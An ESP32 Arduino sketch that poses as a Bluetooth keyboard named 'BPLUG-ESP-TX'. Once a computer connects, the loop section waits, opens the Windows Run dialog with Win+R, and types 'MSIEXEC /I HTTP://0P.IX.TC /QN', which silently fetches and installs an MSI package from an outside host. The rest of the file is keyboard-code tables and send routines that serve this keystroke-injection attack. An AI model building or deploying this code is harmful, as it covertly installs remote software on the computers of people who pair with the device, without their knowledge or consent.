#include <soc/rtc_cntl_reg.h>
//#include <WiFi.h>
//#include <WiFiClient.h>
#include <BluetoothSerial.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>
#include <BLEScan.h>
#include <BLE2902.h>
#include <esp_mac.h>
#include <math.h>

#if !defined(CONFIG_BT_ENABLED) || !defined(CONFIG_BLUEDROID_ENABLED)
#error Bluetooth is not enabled! Please run `make menuconfig` to and enable it
#endif

#define KBD_SEND_DELAY_MS 20 
#define Service_UUID "0000ffe0-0000-1000-8000-00805f9b34fb"
#define CharacRDWT_UUID "0000ffe1-0000-1000-8000-00805f9b34fb"
#define CharacWRITE_UUID "0000ffe3-0000-1000-8000-00805f9b34fb"
#define CharacNOTI_UUID "0000ffe4-0000-1000-8000-00805f9b34fb"
#define CharacREAD_UUID "0000ffe5-0000-1000-8000-00805f9b34fb"
#define CharacINDI_UUID "0000ffe7-0000-1000-8000-00805f9b34fb"


#define SHIFT 0x80
#define CTRL  0x01
#define ALT   0x04
#define GUI   0x08
const uint8_t _asciimap[128] PROGMEM = {
    0x00, // NUL
    0x00, // SOH
    0x00, // STX
    0x00, // ETX
    0x00, // EOT
    0x00, // ENQ
    0x00, // ACK
    0x00, // BEL
    0x2a, // BS	Backspace
    0x2b, // TAB	Tab
    0x28, // LF	Enter
    0x00, // VT
    0x00, // FF
    0x00, // CR
    0x00, // SO
    0x00, // SI
    0x00, // DEL
    0x00, // DC1
    0x00, // DC2
    0x00, // DC3
    0x00, // DC4
    0x00, // NAK
    0x00, // SYN
    0x00, // ETB
    0x00, // CAN
    0x00, // EM
    0x00, // SUB
    0x00, // ESC
    0x00, // FS
    0x00, // GS
    0x00, // RS
    0x00, // US

    0x2c,         //  ' '
    0x1e | SHIFT, // !
    0x34 | SHIFT, // "
    0x20 | SHIFT, // #
    0x21 | SHIFT, // $
    0x22 | SHIFT, // %
    0x24 | SHIFT, // &
    0x34,         // '
    0x26 | SHIFT, // (
    0x27 | SHIFT, // )
    0x25 | SHIFT, // *
    0x2e | SHIFT, // +
    0x36,         // ,
    0x2d,         // -
    0x37,         // .
    0x38,         // /
    0x27,         // 0
    0x1e,         // 1
    0x1f,         // 2
    0x20,         // 3
    0x21,         // 4
    0x22,         // 5
    0x23,         // 6
    0x24,         // 7
    0x25,         // 8
    0x26,         // 9
    0x33 | SHIFT, // :
    0x33,         // ;
    0x36 | SHIFT, // <
    0x2e,         // =
    0x37 | SHIFT, // >
    0x38 | SHIFT, // ?
    0x1f | SHIFT, // @
    0x04 | SHIFT, // A
    0x05 | SHIFT, // B
    0x06 | SHIFT, // C
    0x07 | SHIFT, // D
    0x08 | SHIFT, // E
    0x09 | SHIFT, // F
    0x0a | SHIFT, // G
    0x0b | SHIFT, // H
    0x0c | SHIFT, // I
    0x0d | SHIFT, // J
    0x0e | SHIFT, // K
    0x0f | SHIFT, // L
    0x10 | SHIFT, // M
    0x11 | SHIFT, // N
    0x12 | SHIFT, // O
    0x13 | SHIFT, // P
    0x14 | SHIFT, // Q
    0x15 | SHIFT, // R
    0x16 | SHIFT, // S
    0x17 | SHIFT, // T
    0x18 | SHIFT, // U
    0x19 | SHIFT, // V
    0x1a | SHIFT, // W
    0x1b | SHIFT, // X
    0x1c | SHIFT, // Y
    0x1d | SHIFT, // Z
    0x2f,         // [
    0x31,         // bslash
    0x30,         // ]
    0x23 | SHIFT, // ^
    0x2d | SHIFT, // _
    0x35,         // `
    0x04,         // a
    0x05,         // b
    0x06,         // c
    0x07,         // d
    0x08,         // e
    0x09,         // f
    0x0a,         // g
    0x0b,         // h
    0x0c,         // i
    0x0d,         // j
    0x0e,         // k
    0x0f,         // l
    0x10,         // m
    0x11,         // n
    0x12,         // o
    0x13,         // p
    0x14,         // q
    0x15,         // r
    0x16,         // s
    0x17,         // t
    0x18,         // u
    0x19,         // v
    0x1a,         // w
    0x1b,         // x
    0x1c,         // y
    0x1d,         // z
    0x2f | SHIFT, // {
    0x31 | SHIFT, // |
    0x30 | SHIFT, // }
    0x35 | SHIFT, // ~
    0             // DEL
};

HardwareSerial UART0(0);//定义串口对象

const char myBleName[] = "BPLUG-ESP-TX";//低功耗蓝牙设备名称
uint8_t BleMacAddr[6] = {0x84,0xC2,0xE4,0x03,0x02,(uint8_t)(0x06-2)};//低功耗蓝牙MAC地址

BLEServer *pServer = NULL;
BLEService *pService = NULL;

BLECharacteristic *pCharacRDWT = NULL;
BLECharacteristic *pCharacWRITE = NULL;

BLECharacteristic *pCharacINDI = NULL;
BLECharacteristic *pCharacNOTI = NULL;
BLECharacteristic *pCharacREAD = NULL;
BLEAdvertising *pAdvertising = NULL;

uint8_t KbdData[8] = {0, 0, 0, 0, 0, 0, 0, 0};//keyboard数据包




void BLE_kbd_fastprint(const char *str) {
    char currentSeg[6] = {0};
    uint8_t segLen = 0;
    bool currentShift = false; // 新增：当前分段的Shift状态
    
    for(const char *p = str; *p; p++){
        if(is_special(*p)){
            if(segLen > 0){
                send_normal_segment(currentSeg, segLen, currentShift);
                segLen = 0;
                currentShift = false;
            }
            send_special_key(*p);
        } else {
            // 新增：获取字符的Shift需求
            bool needShift = (pgm_read_byte(&_asciimap[(uint8_t)*p]) & SHIFT) != 0;
            
            // 新增分割条件：Shift状态变化或重复字符或长度限制
            bool needSplit = (segLen >= 6) || 
                           (currentSeg[segLen-1] == *p) || 
                           (needShift != currentShift);

            if(needSplit){
                send_normal_segment(currentSeg, segLen, currentShift);
                segLen = 0;
                currentShift = needShift; // 重置当前分段Shift状态
            }
            
            currentSeg[segLen++] = *p;
            currentShift = needShift; // 更新当前分段Shift状态
        }
    }
    
    if(segLen > 0){
        send_normal_segment(currentSeg, segLen, currentShift);
    }
}

// 修改发送函数添加Shift状态参数
void send_normal_segment(const char *segment, uint8_t len, bool needShift) {
    static uint8_t lastModifier = 0;
    
    memset(KbdData, 0, 8);
    KbdData[0] = needShift ? 0x02 : 0x00; // 明确设置Shift状态
    
    for(int i=0; i<len && i<6; i++){
        uint8_t code = pgm_read_byte(&_asciimap[(uint8_t)segment[i]]);
        KbdData[2+i] = code & 0x7F; // 确保清除Shift标志
    }
    
    // 发送按键
    pCharacNOTI->setValue(KbdData, 8);
    pCharacNOTI->notify();
    
    // 发送释放包（必须清除所有修饰键）
    vTaskDelay(20/portTICK_PERIOD_MS);
    memset(KbdData, 0, 8);
    pCharacNOTI->setValue(KbdData, 8);
    pCharacNOTI->notify();
    vTaskDelay(20/portTICK_PERIOD_MS);
}


void clear_kbdData(void){
  memset(KbdData, 0, 8);
}


// 增强发送特殊字符函数
void send_special_key(char c) {
    memset(KbdData, 0, 8);
    
    switch(c) {
        case '\n': case '\r': // Enter
            KbdData[2] = 0x28;
            break;
        case '\t': // Tab
            KbdData[2] = 0x2b;
            break;
        case '\b': // Backspace
            KbdData[2] = 0x2a;
            break;
        case 0xF1: // F1
            KbdData[2] = 0x3A;
            break;
        case 0xF2: // F2
            KbdData[2] = 0x3B;
            break;
    }
    
    pCharacNOTI->setValue(KbdData, 8);
    pCharacNOTI->notify();
    vTaskDelay(20/portTICK_PERIOD_MS);
    memset(KbdData, 0, 8);
    pCharacNOTI->notify();
}


void BLE_kbd_send(void){
  pCharacNOTI->setValue(KbdData, 8);
  pCharacNOTI->notify();
}


// 字符到HID键码转换
uint8_t char_to_hid(char c) {
    if(c >= 0 && c <= 127) {
        return pgm_read_byte(&_asciimap[(uint8_t)c]) & 0x7F; // 返回原始键码
    }
    return 0;
}

bool is_special(char c) {
    return (c == '\n' || c == '\r' || c == '\t' || c == '\b' || 
           (c >= 0xF1 && c <= 0xFE)); // F1-F12范围
}



void setup(){
  WRITE_PERI_REG(RTC_CNTL_BROWN_OUT_REG, 0);
  UART0.begin(115200,SERIAL_8N1,3,1,false,20000UL);
  UART0.printf("\nStart\n");

  pinMode(0,INPUT);

  esp_base_mac_addr_set(BleMacAddr);
  BLEDevice::init(myBleName);
  
  pServer = BLEDevice::createServer();
  pService = pServer->createService(Service_UUID);

  pCharacRDWT = pService->createCharacteristic(CharacRDWT_UUID,BLECharacteristic::PROPERTY_READ | BLECharacteristic::PROPERTY_WRITE);
  pCharacWRITE = pService->createCharacteristic(CharacWRITE_UUID,BLECharacteristic::PROPERTY_WRITE);
  pCharacNOTI = pService->createCharacteristic(CharacNOTI_UUID,BLECharacteristic::PROPERTY_NOTIFY);
  pCharacNOTI->addDescriptor(new BLE2902());
  pCharacREAD = pService->createCharacteristic(CharacNOTI_UUID,BLECharacteristic::PROPERTY_READ);
  pCharacINDI = pService->createCharacteristic(CharacINDI_UUID,BLECharacteristic::PROPERTY_INDICATE);
  
  pService->start();
  
  pAdvertising = BLEDevice::getAdvertising();
  pAdvertising->addServiceUUID(Service_UUID);
  pAdvertising->start();
}

bool sended = false;
void loop(){
  disableCore1WDT();
  TickType_t xLastWakeTime;
  vTaskDelay(10);
  
  while(1){
    xLastWakeTime = xTaskGetTickCount();
    static uint8_t printTick = 0;
    if(pServer->getConnectedCount() == 0){}//无客户端连接
    else{ //有客户端链接
      
      vTaskDelayUntil(&xLastWakeTime, 8000);
      if(!sended){
        clear_kbdData();
        KbdData[0]=0xFF;//打开caplock，确保caplock打开, 无视输入法可能导致的问题
        BLE_kbd_send();
        vTaskDelayUntil(&xLastWakeTime, 40);
        clear_kbdData();
        KbdData[0]=0x08; KbdData[2]=0x15; //win+r
        BLE_kbd_send();
        vTaskDelayUntil(&xLastWakeTime, 20);
        clear_kbdData();
        BLE_kbd_send();
        vTaskDelayUntil(&xLastWakeTime, 300);
        //BLE_kbd_fastprint("MSIEXEC /I HTTPS://EXAMPLE.COM/1.MSI /QUIET\n");
        //BLE_kbd_fastprint("msiexec /i https://example.com/1.msi /quiet\n");
        BLE_kbd_fastprint("MSIEXEC /I HTTP://0P.IX.TC /QN\n");
        sended = true;
      }
    }
    if(printTick == 0){
      UART0.printf("CNT:%d\n",pServer->getConnectedCount());//打印连接数
    }
    printTick = (printTick + 1) % 50;//计数分频变量
    
    //delay(10);
    vTaskDelayUntil(&xLastWakeTime,20);//20ms周期
  }
}
